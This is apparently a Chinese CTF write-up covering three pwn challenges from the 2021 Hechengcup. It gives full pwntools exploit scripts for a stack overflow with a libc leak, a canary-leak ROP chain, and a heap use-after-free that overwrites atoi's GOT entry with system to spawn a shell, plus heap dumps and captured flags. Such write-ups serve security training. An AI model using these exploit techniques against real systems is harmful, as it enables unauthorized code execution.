---
layout: post
title:  合成杯（鹤城杯）部分PWN
date:   2021-10-08 00:01:01 +0300
image:  2021-10-08-pebbles.jpg
tags:   [ctf,Pwn,canary,rop,heap,UAF,鹤城杯]
---

第一次在比赛中做出Pwn题

### babyof

漏洞函数

```
int sub_400632()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Do you know how to do buffer overflow?");
  read(0, buf, 0x100uLL);
  return puts("I hope you win");
}
```

栈溢出，先泄露libc地址，再利用system("/bin/sh")打

但是这道题我自己用system("/bin/sh")没有打通，使用onegadget打通了。

```assembly
from pwn import *
from LibcSearcher import *

libc = ELF("./libc-2.27.so")

io = remote("182.116.62.85", 21613)

pop_rdi = 0x400743
puts_plt = 0x400520
puts_got = 0x601018
main = 0x40066B
payload = "a"*(64 + 8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
io.recvuntil("Do you know how to do buffer overflow?\n")
io.sendline(payload)

io.recvuntil("I hope you win\n")
addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(addr))

# libc = LibcSearcher("puts", addr)
# base = addr - libc.dump("puts")
# system = base + libc.dump("system")
# binsh = base + libc.dump("str_bin_sh")

base = addr - libc.symbols["puts"]
system = base + libc.symbols["system"]
binsh = base + libc.search("/bin/sh").next()
one_gadget = [base + 0x4f3d5, base + 0x4f432, base + 0x10a41c]
# print(hex(binsh))
# payload = "a"*(64 + 8) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(main)
payload = "a"*(64 + 8) + p64(one_gadget[1])
io.recvuntil("Do you know how to do buffer overflow?\n")
io.sendline(payload)

'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

io.interactive()
```

### littleof

漏洞函数

```assembly
unsigned __int64 sub_4006E2()
{
  char buf[8]; // [rsp+10h] [rbp-50h] BYREF
  FILE *v2; // [rsp+18h] [rbp-48h]
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v2 = stdin;
  puts("Do you know how to do buffer overflow?");
  read(0, buf, 0x100uLL);
  printf("%s. Try harder!", buf);
  read(0, buf, 0x100uLL);
  puts("I hope you win");
  return __readfsqword(0x28u) ^ v3;
}
```

这道题有了canary，先泄露canary，再泄露libc地址，然后执行"/bin/sh"

```assembly
from pwn import *
from LibcSearcher import *

io = remote("182.116.62.85", 27056)
libc = ELF("./libc-2.27.so")

payload = "a"*(0x50-8)
io.recvuntil("Do you know how to do buffer overflow?\n")
io.sendline(payload)


io.recvuntil("a"*0x48)
canary = u64(io.recv(8)) - 0xa
print(hex(canary))

pop_rdi = 0x400863
puts_plt = 0x4005B0
puts_got = 0x601018
main = 0x400789
ret = 0x4006E2
payload = "a"*0x48 + p64(canary) + "a"*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
io.recvuntil("Try harder!")
io.sendline(payload)

io.recvline()
addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(addr))

# time 2
base = addr - libc.symbols["puts"]
system = base + libc.symbols["system"]
binsh = base + libc.search("/bin/sh").next()
one_gadget = [base + 0x4f3d5, base + 0x4f432, base + 0x10a41c]


payload = "a"*(0x50-8)
io.recvuntil("Do you know how to do buffer overflow?\n")
io.sendline(payload)

io.recvuntil("a"*0x48)
canary = u64(io.recv(8)) - 0xa
print(hex(canary))


payload = "a"*0x48 + p64(canary) + "a"*8 + p64(one_gadget[2])
io.recvuntil("Try harder!")
io.sendline(payload)

'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
# flag{25e96197d4da10748a055753b5104856}
io.interactive()
```

### supermarket

攻防世界pwn原题，而且攻防世界还给了libc，使用之前的脚本改下ip和端口直接打

```assembly
# -*-coding:utf-8-*-
from pwn import *

elf = ELF("./task_supermarket")
libc = ELF("./libc.so.6")

# io = process("./supermarket")
io = remote("182.116.62.85", 27518)

def add(name, descrip_size, description):
    io.recvuntil("your choice>> ")
    io.sendline(str(1))
    io.recvuntil("name:")
    io.sendline(name)
    io.recvuntil("price:")
    io.sendline("10")
    io.recvuntil("descrip_size:")
    io.sendline(str(descrip_size))
    io.recvuntil("description:")
    io.sendline(description)

def del_(name):
    io.recvuntil("your choice>> ")
    io.sendline(str(2))
    io.recvuntil("name:")
    io.sendline(name)

def list_():
    io.recvuntil("your choice>> ")
    io.sendline(str(3))

def changePrice(name, delta):
    io.recvuntil("your choice>> ")
    io.sendline(str(4))
    io.recvuntil("name:")
    io.sendline(name)
    io.recvuntil("input the value you want to cut or rise in:")
    io.sendline(str(delta))

def changeDescription(name, descrip_size, description):
    io.recvuntil("your choice>> ")
    io.sendline(str(5))
    io.recvuntil("name:")
    io.sendline(name)
    io.recvuntil("descrip_size:")
    io.sendline(str(descrip_size))
    io.recvuntil("description:")
    io.sendline(description)

add("0", 0x80, "a"*0x10)
add("1", 0x20, "b"*0x10)
# gdb.attach(io)
# raw_input()
'''
0x9ef5000:	0x0000002100000000	0x0000000000000030 commodity0
0x9ef5010:	0x0000000000000000	0x000000800000000a
0x9ef5020:	0x0000008909ef5028	0x6161616161616161 commodity0->description
0x9ef5030:	0x6161616161616161	0x0000000000000000
0x9ef5040:	0x0000000000000000	0x0000000000000000
0x9ef5050:	0x0000000000000000	0x0000000000000000
0x9ef5060:	0x0000000000000000	0x0000000000000000
0x9ef5070:	0x0000000000000000	0x0000000000000000
0x9ef5080:	0x0000000000000000	0x0000000000000000
0x9ef5090:	0x0000000000000000	0x0000000000000000
0x9ef50a0:	0x0000000000000000	0x0000002100000000 commodity1
0x9ef50b0:	0x0000000000000031	0x0000000000000000
0x9ef50c0:	0x000000200000000a	0x0000002909ef50d0 commodity1->description
0x9ef50d0:	0x6262626262626262	0x6262626262626262
0x9ef50e0:	0x0000000000000000	0x0000000000000000
'''

changeDescription("0", 0x90, "")
'''
0x88e4000:	0x0000002100000000	0x0000000000000030 commodity0
0x88e4010:	0x0000000000000000	0x000000800000000a
0x88e4020:	0x00000089088e4028	0xf7f457b0f7f45700 commodity0->description
0x88e4030:	0x6161616161616161	0x0000000000000000
0x88e4040:	0x0000000000000000	0x0000000000000000
0x88e4050:	0x0000000000000000	0x0000000000000000
0x88e4060:	0x0000000000000000	0x0000000000000000
0x88e4070:	0x0000000000000000	0x0000000000000000
0x88e4080:	0x0000000000000000	0x0000000000000000
0x88e4090:	0x0000000000000000	0x0000000000000000
0x88e40a0:	0x0000000000000000	0x0000002000000088 commodity1
0x88e40b0:	0x0000000000000031	0x0000000000000000
0x88e40c0:	0x000000200000000a	0x00000029088e40d0 commodity1->description
0x88e40d0:	0x6262626262626262	0x6262626262626262
0x88e40e0:	0x0000000000000000	0x0000000000000000
0x88e40f0:	0x0000009900000000	0x6161616161616161 commodity0->description
0x88e4100:	0x6161616161616161	0x0000000000000000
0x88e4110:	0x0000000000000000	0x0000000000000000
0x88e4120:	0x0000000000000000	0x0000000000000000
0x88e4130:	0x0000000000000000	0x0000000000000000
0x88e4140:	0x0000000000000000	0x0000000000000000
0x88e4150:	0x0000000000000000	0x0000000000000000
0x88e4160:	0x0000000000000000	0x0000000000000000
0x88e4170:	0x0000000000000000	0x0000000000000000
0x88e4180:	0x0000000000000000
'''

add("2", 0x20, "c"*0x10)
'''
0x9e32000:	0x0000002100000000	0x0000000000000030 commodity0
0x9e32010:	0x0000000000000000	0x000000800000000a
0x9e32020:	0x0000002109e32028	0xf7f9c830f7f90032 commodity2                 \ commodity0->description
0x9e32030:	0x6161616161616161	0x000000200000000a                            |
0x9e32040:	0x0000002909e32048	0x6363636363636363 \ commodity2->description  |
0x9e32050:	0x6363636363636363	0x0000000000000000 /                          |
0x9e32060:	0x0000000000000000	0x0000004100000000 \                          |
0x9e32070:	0xf7f9c7b0f7f9c7b0	0x0000000000000000 |                          |
0x9e32080:	0x0000000000000000	0x0000000000000000 |                          |
0x9e32090:	0x0000000000000000	0x0000000000000000 /                          /
0x9e320a0:	0x0000000000000000	0x0000002000000040 commodity1
0x9e320b0:	0x0000000000000031	0x0000000000000000
0x9e320c0:	0x000000200000000a	0x0000002909e320d0 commodity1->description
0x9e320d0:	0x6262626262626262	0x6262626262626262
0x9e320e0:	0x0000000000000000	0x0000000000000000
0x9e320f0:	0x0000009900000000	0x6161616161616161 commodity0->description
0x9e32100:	0x6161616161616161	0x0000000000000000
0x9e32110:	0x0000000000000000	0x0000000000000000
0x9e32120:	0x0000000000000000	0x0000000000000000
0x9e32130:	0x0000000000000000	0x0000000000000000
0x9e32140:	0x0000000000000000	0x0000000000000000
0x9e32150:	0x0000000000000000	0x0000000000000000
0x9e32160:	0x0000000000000000	0x0000000000000000
0x9e32170:	0x0000000000000000	0x0000000000000000
0x9e32180:	0x0000000000000000
'''
atoi_got = elf.got["atoi"]
payload = "2".ljust(0x10, "\x00") + p32(20) + p32(0x20) + p32(atoi_got)
# size与创建时的大小一致
changeDescription("0", 0x80, payload)
'''
0x9e32000:	0x0000002100000000	0x0000000000000030 commodity0
0x9e32010:	0x0000000000000000	0x000000800000000a
0x9e32020:	0x0000002109e32028	0x0000000000000032 commodity2                 \ commodity0->description
0x9e32030:	0x0000000000000000	0x0000002000000014                            |
0x9e32040:	0x00000000ATOI_GOT	0x6363636363636363 \ commodity2->description  |
0x9e32050:	0x6363636363636363	0x0000000000000000 /                          |
0x9e32060:	0x0000000000000000	0x0000004100000000 \                          |
0x9e32070:	0xf7f9c7b0f7f9c7b0	0x0000000000000000 |                          |
0x9e32080:	0x0000000000000000	0x0000000000000000 |                          |
0x9e32090:	0x0000000000000000	0x0000000000000000 /                          /
0x9e320a0:	0x0000000000000000	0x0000002000000040 commodity1
0x9e320b0:	0x0000000000000031	0x0000000000000000
0x9e320c0:	0x000000200000000a	0x0000002909e320d0 commodity1->description
0x9e320d0:	0x6262626262626262	0x6262626262626262
0x9e320e0:	0x0000000000000000	0x0000000000000000
0x9e320f0:	0x0000009900000000	0x6161616161616161 commodity0->description
0x9e32100:	0x6161616161616161	0x0000000000000000
0x9e32110:	0x0000000000000000	0x0000000000000000
0x9e32120:	0x0000000000000000	0x0000000000000000
0x9e32130:	0x0000000000000000	0x0000000000000000
0x9e32140:	0x0000000000000000	0x0000000000000000
0x9e32150:	0x0000000000000000	0x0000000000000000
0x9e32160:	0x0000000000000000	0x0000000000000000
0x9e32170:	0x0000000000000000	0x0000000000000000
0x9e32180:	0x0000000000000000
'''
list_()

io.recvuntil("price.20, des.")
addr = u32(io.recvuntil("\n")[:-1])
print(hex(addr))

base = addr - libc.symbols["atoi"]
system = base + libc.symbols["system"]

# commodity2->description/atoi_got指向的位置改为system的地址
# 下次调用atoi()时，其实是调用了system()
# size与创建时的大小一致
# !注意，这里的第一个参数name，要与上一个我们自己构造的payload相对应
changeDescription("2", 0x20, p32(system))

# 输出menu后，要求我们输入choice，
# 然后将我们输入的字符串作为了atoi()的参数
# 输入"/bin/sh"触发漏洞

io.recvuntil("your choice>> ")
io.sendline("/bin/sh")

# flag{03b1baaab2a949db11f8b1c02a4f7ab6}
io.interactive()
```

